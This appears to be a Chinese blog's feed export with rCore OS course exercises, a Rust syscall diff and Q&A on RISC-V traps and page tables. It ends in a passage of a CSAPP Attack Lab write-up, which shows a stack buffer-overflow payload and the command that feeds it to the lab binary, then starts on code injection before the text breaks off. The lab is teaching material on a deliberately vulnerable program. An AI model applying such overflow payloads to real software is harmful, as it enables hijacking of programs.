页表大致占用多少内存 (估算数量级即可)？</p><p><strong>A4:</strong> 略。</p><p><strong>Q5:</strong> 请简单思考如何才能实现 Lazy 策略，缺页时又如何处理？描述合理即可，不需要考虑实现。</p><p><strong>A5:</strong> 加载程序时并不真正将代码段加载到内存，将页表项的有效位设置为 0，访问该代码段时会触发缺页异常，进入内核后得知异常原因是访问 Lazy 页面，随后进行异常处理：将页面从磁盘加载入内存，随后返回用户态重新执行。</p><p>缺页的另一个常见原因是 swap 策略，也就是内存页面可能被换到磁盘上了，导致对应页面失效。</p><p><strong>Q6:</strong> 此时页面失效如何表现在页表项(PTE)上？</p><p><strong>A6:</strong> 有效位为 0.</p><h2 id="t3"><a href="#t3" class="headerlink" title="t3"></a>t3</h2><p>为了防范侧信道攻击，我们的 os 使用了双页表。但是传统的设计一直是单页表的，也就是说， 用户线程和对应的内核线程共用同一张页表，只不过内核对应的地址只允许在内核态访问。 (备注：这里的单/双的说法仅为自创的通俗说法，并无这个名词概念，详情见 <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">KPTI</a> )</p><p><strong>Q1:</strong> 在单页表情况下，如何更换页表？</p><p><strong>A1:</strong> 无需更换，通过标志位进行控制，可能需要将 TLB 清空。</p><p><strong>Q2:</strong> 单页表情况下，如何控制用户态无法访问内核页面？（tips:看看上一题最后一问）</p><p><strong>A2:</strong> 将内核页面的 U 标志位设置为 0.</p><p><strong>Q3:</strong> 单页表有何优势？（回答合理即可）</p><p><strong>A3:</strong> 不需要跳板代码进行用户态和内核态的切换，内核态和用户态切换的速度更快。</p><p><strong>Q4:</strong> 双页表实现下，何时需要更换页表？假设你写一个单页表操作系统，你会选择何时更换页表（回答合理即可）？</p><p><strong>A4:</strong> 双页表实现下，用户态和内核态切换、不同进程切换时需要更换页表。对于单页表操作系统，不同用户线程切换时需要更换页表。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter3练习</title>
    <link href="http://lordaeronesz.github.io/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/</id>
    <published>2024-10-28T15:30:11.000Z</published>
    <updated>2024-11-04T11:42:46.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>rCore 的第一个实验，主要是为了熟悉如何进行内核编程，实现起来比较简单。</p><p>要求实现一个系统调用，填充传入的 <code>TaskInfo</code> 结构体已获取当前任务的一些信息，包含三个字段：任务状态、任务使用的系统调用及调用次数、系统调用时刻距离任务第一次被调度时刻的时长（单位 ms）。</p><p>首先是任务状态，这个比较简单，直接查看当前任务的任务控制块的字段值即可。</p><p>对于系统调用次数，可以在任务控制块中添加新的字段来存储相关信息，例如按提示所说，一个长度为 <code>MAX_SYSCALL_NUM</code> 的整型数组。在函数 <code>syscall/mod.rs:syscall</code> 中，在内核对用户态传入的系统调用号进行分发处理前，增加对应的系统调用桶的计数。注意，由于本次系统调用 <code>sys_task_info</code> 也要进行计数，因此不能在执行了特定的系统调用后再来增加计数，否则本次 <code>sys_task_info</code> 系统调用次数将无法被统计。</p><p>最后是距离任务第一次被调度时刻的时长，一种实现方式是：为任务控制块添加新的字段：<code>time</code>，表示任务第一次被调度的时间。先为 <code>time</code> 设定一个初始值（例如 0），表示该值未被更改过，每当一个任务即将被调度时（如 <code>TASK_MANAGER.run_next_task()</code> 进行任务切换时），查看 <code>time</code> 值，判断是否未被更改：如果是，则赋予当前时间；否则，不做任何操作。这样，就成功保存了任务初次被调度的时刻。在调用 <code>sys_task_info</code> 时，将当前时间减去保存的初次被调度时间，即为时长，注意单位为毫秒。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于代码是直接在原项目代码的基础上进行修改，因此为了查看方便，本次及之后实验的代码将以 <code>git diff</code> 的形式展现，加号（绿色）代表添加的代码，减号（红色）代表删除的代码。</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex e6e8f98..7f63ed6 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -26,8 +26,13 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::inc_syscall_times;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // increase syscall times before handle specific syscall</span><span class="token prefix inserted">+</span><span class="token line">    inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_EXIT => sys_exit(args[0] as i32),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f1cd424..8d01cf4 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,8 +1,9 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    task::&#123;exit_current_and_run_next, suspend_current_and_run_next, TaskStatus&#125;,</span><span class="token prefix deleted">-</span><span class="token line">    timer::get_time_us,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    task::&#123;exit_current_and_run_next, get_current_tcb, suspend_current_and_run_next, TaskStatus&#125;,</span><span class="token prefix inserted">+</span><span class="token line">    timer::&#123;get_time_ms, get_time_us&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -53,5 +54,19 @@ pub fn sys_get_time(ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_task_info");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let cur_tcb = get_current_tcb();</span><span class="token prefix inserted">+</span><span class="token line">    // labour in vain! The status must be Running</span><span class="token prefix inserted">+</span><span class="token line">    let status = cur_tcb.task_status;</span><span class="token prefix inserted">+</span><span class="token line">    let syscall_times = cur_tcb.syscall_times;</span><span class="token prefix inserted">+</span><span class="token line">    let time = get_time_ms() - cur_tcb.time;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">        *_ti = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">            status,</span><span class="token prefix inserted">+</span><span class="token line">            syscall_times,</span><span class="token prefix inserted">+</span><span class="token line">            time,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex c1636ef..4a14e2f 100644<span class="token coord">--- a/os/src/task/mod.rs</span><span class="token coord">+++ b/os/src/task/mod.rs</span>@@ -14,9 +14,11 @@ mod switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(clippy::module_inception)]</span><span class="token prefix unchanged"> </span><span class="token line">mod task;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MAX_APP_NUM;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MAX_APP_NUM, MAX_SYSCALL_NUM&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::loader::&#123;get_num_app, init_app_cx&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span><span class="token prefix unchanged"> </span><span class="token line">use switch::__switch;</span><span class="token prefix unchanged"> </span><span class="token line">pub use task::&#123;TaskControlBlock, TaskStatus&#125;;</span></span>@@ -54,6 +56,8 @@ lazy_static! &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let mut tasks = [TaskControlBlock &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            task_cx: TaskContext::zero_init(),</span><span class="token prefix unchanged"> </span><span class="token line">            task_status: TaskStatus::UnInit,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">            time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;; MAX_APP_NUM];</span><span class="token prefix unchanged"> </span><span class="token line">        for (i, task) in tasks.iter_mut().enumerate() &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            task.task_cx = TaskContext::goto_restore(init_app_cx(i));</span></span>@@ -122,6 +126,11 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut inner = self.inner.exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let current = inner.current_task;</span><span class="token prefix unchanged"> </span><span class="token line">            inner.tasks[next].task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if inner.tasks[next].time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                inner.tasks[next].time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.current_task = next;</span><span class="token prefix unchanged"> </span><span class="token line">            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;</span></span>@@ -135,6 +144,24 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            panic!("All applications completed!");</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task control block</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_current_tcb(&amp;self) -> TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Run the first task in task list.</span></span>@@ -169,3 +196,13 @@ pub fn exit_current_and_run_next() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mark_current_exited();</span><span class="token prefix unchanged"> </span><span class="token line">    run_next_task();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task control block</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_current_tcb() -> TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_current_tcb()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn inc_syscall_times(syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.inc_syscall_times(syscall_id)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex e6580c9..4e4c19b 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::MAX_SYSCALL_NUM;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The task control block (TCB) of a task.</span><span class="token prefix unchanged"> </span><span class="token line">#[derive(Copy, Clone)]</span></span>@@ -9,6 +10,10 @@ pub struct TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub task_status: TaskStatus,</span><span class="token prefix unchanged"> </span><span class="token line">    /// The task context</span><span class="token prefix unchanged"> </span><span class="token line">    pub task_cx: TaskContext,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The status of a task</span></span></code></pre><blockquote><p><code>time</code> 的设置有一点小 bug，就是第一个被调度任务的 <code>time</code> 应该在 <code>run_first_task</code> 中设置，否则它的 <code>time</code> 将会晚一个调度周期，testcase 没测出来。。。写博客时才注意到，懒得改了😓</p></blockquote><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><strong>Q:</strong> 正确进入 U 态后，程序的特征还应有：使用 S 态特权指令，访问 S 态寄存器后会报错。 请同学们可以自行测试这些内容（运行 <a href="https://github.com/LearningOS/rCore-Tutorial-Test-2024A/tree/master/src/bin">三个 bad 测例 (ch2b_bad_*.rs)</a> ）， 描述程序出错行为，同时注意注明你使用的 sbi 及其版本。</p><p><strong>A:</strong> 略。</p><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p>深入理解 <a href="https://github.com/LearningOS/rCore-Tutorial-Code-2024A/blob/ch3/os/src/trap/trap.S">trap.S</a> 中两个函数 <code>__alltraps</code> 和 <code>__restore</code> 的作用，并回答如下问题：</p><p><strong>Q1:</strong> L40：刚进入 <code>__restore</code> 时，<code>a0</code> 代表了什么值。请指出 <code>__restore</code> 的两种使用情景。</p><p><strong>A1:</strong> <code>a0</code> 代表了内核栈的栈指针，即 <code>__alltraps</code> 保存的上下文的首地址。</p><p>情景一：表示内核第一次从内核态切换到用户态（或者说将 CPU 所有权转交给用户程序），在初始化或加载应用程序时，内核通过 <code>__restore</code> 恢复必要的状态。</p><p>情景二：当 <code>call trap_handler</code> 执行结束后，程序计数器指向它的下一条指令，即 <code>__restore</code> 的起始地址，表示 Trap 处理完成，将恢复 Trap 时的上下文状态，返回用户态。</p><p><strong>Q2:</strong> L43-L48：这几行汇编代码特殊处理了哪些寄存器？这些寄存器的的值对于进入用户态有何意义？请分别解释。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ld t0, 32*8(sp)ld t1, 33*8(sp)ld t2, 2*8(sp)csrw sstatus, t0csrw sepc, t1csrw sscratch, t2</code></pre><p><strong>A2:</strong> 特殊处理了 <code>t0</code>、<code>t1</code>、<code>t2</code>、<code>sstatus</code>、<code>sepc</code>、<code>sscratch</code> 寄存器。</p><p><code>t0</code>、<code>t1</code>、<code>t2</code> 用来暂存从内核栈中读取的之前保存的 CSR 寄存器的值，再使用 <code>csrw</code> 指令将暂存值写入对应的 CSR 寄存器中。</p><p>其中 <code>sstatus</code> 的 <code>SPP</code> 字段给出 Trap 发生之前 CPU 处在哪个特权级等信息，<code>sepc</code> 当 Trap 是异常时（exception）记录之前执行的最后一条指令地址，<code>sscratch</code> 则存储着用户栈的栈指针，用于在 <code>sret</code> 返回用户态前使用 <code>csrrw</code> 指令将当前栈指针从内核栈切换到用户栈。</p><p><strong>Q3:</strong> L50-L56：为何跳过了 <code>x2</code> 和 <code>x4</code>？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ld x1, 1*8(sp)ld x3, 3*8(sp).set n, 5.rept 27   LOAD_GP %n   .set n, n+1.endr</code></pre><p><strong>A3:</strong> 如下图所示，<code>x2</code> 即 <code>sp</code> 寄存器，保存了内核栈的栈指针。而 <code>x4</code> 寄存器为线程寄存器，在本实验中不会用到。</p><p><img src="/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/reg.png"></p><p><strong>Q4:</strong> L60：该指令之后，<code>sp</code> 和 <code>sscratch</code> 中的值分别有什么意义？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp</code></pre><p><strong>A4:</strong> 该指令的作用是先将 <code>sscratch</code> 的值读取到 <code>sp</code> 中，再将 <code>sp</code> 的值写入 <code>sscratch</code> 中，这两个操作是在同一周期内完成的，无需中间寄存器的参与，作用相当于 <code>swap(sp, sscratch)</code>. 在返回用户态之前交换 <code>sp</code> 和 <code>sscratch</code> 的值，即将当前栈指针由用户栈切换到内核栈。</p><p><strong>Q5:</strong> <code>__restore</code>：中发生状态切换在哪一条指令？为何该指令执行之后会进入用户态？</p><p><strong>A5:</strong> 状态切换发生在 <code>sret</code>，该指令会负责从栈中恢复之前保存的程序计数器值，并更新特权级相关的寄存器（如 <code>mstatus</code>）。</p><p><strong>Q6:</strong> L13：该指令之后，<code>sp</code> 和 <code>sscratch</code> 中的值分别有什么意义？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp</code></pre><p><strong>A6:</strong> 与 L60 相反，作用是将当前栈指针由内核栈切换到用户栈，便于后续的 Trap 处理。</p><p><strong>Q7:</strong> 从 U 态进入 S 态是哪一条指令发生的？</p><p><strong>A7:</strong> 根据 Trap 的类型不同而定。对于系统调用而言，是 <code>ecall</code> 指令，对于其它的异常情况（如非法操作、页面缺失等）则是在硬件检测到后自动触发异常，从而进入内核态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/</id>
    <published>2024-09-25T03:45:11.000Z</published>
    <updated>2024-09-25T09:32:48.895Z</updated>
    
    <content type="html"><![CDATA[<p>个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 <strong>缓冲区溢出漏洞</strong> 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。</p><span id="more"></span><p>这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 <code>./ctarget -q</code> ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png"></p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>在倒腾好环境之后，终于可以开始着手完成实验了。</p><p>phase_1 要求我们在调用 <code>getbuf</code> 读取标准输入后，不返回到 <code>test</code> 函数接着执行 <code>printf</code>，而是转而执行 <code>touch1</code>.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 <code>getbuf</code> 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:  4017a8:48 83 ec 28          sub    $0x28,%rsp  4017ac:48 89 e7             mov    %rsp,%rdi  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;  4017b4:b8 01 00 00 00       mov    $0x1,%eax  4017b9:48 83 c4 28          add    $0x28,%rsp  4017bd:c3                   retq     4017be:90                   nop  4017bf:90                   nop</code></pre><p>观察上述函数 <code>getbuf</code> 的汇编代码，从第一条指令 <code>sub  $0x28,%rsp</code>，可以看到函数 <code>getbuf</code> 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。</p><blockquote><p>这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。</p></blockquote><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fc0 17 40 00 00 00 00 00  &#x2F;&#x2F; 目标地址</code></pre><p>可以借助 <code>hex2raw</code> 工具将 16 进制转换为对应的字符串，再管道给 <code>ctarget</code> 即可。</p><pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？</p><p>这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 <strong>代码注入(code injection)</strong> 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 <code>getbuf</code> 返回时，就会跳转到我们先前注入的代码，从而达成目的。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>一种有效的注入代码完成的操作如下：</p><ol><li>写入寄存器 <code>%rdi</code> 的值，使其等于 cookie.</li><li>跳转到程序 <code>touch2</code> 处。</li></ol><p>关于跳转，实验手册中推荐使用 <code>ret</code> 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 <code>touch2</code>，可以先使用 <code>push</code> 将 <code>touch2</code> 的地址压入栈中，然后使用 <code>ret</code> 实现跳转。</p><p>对于指令的二进制表示，可以先编译： <code>gcc -c ./injec.s</code>，再反汇编：<code>objdump -d ./injec.o</code> 得到。</p><pre 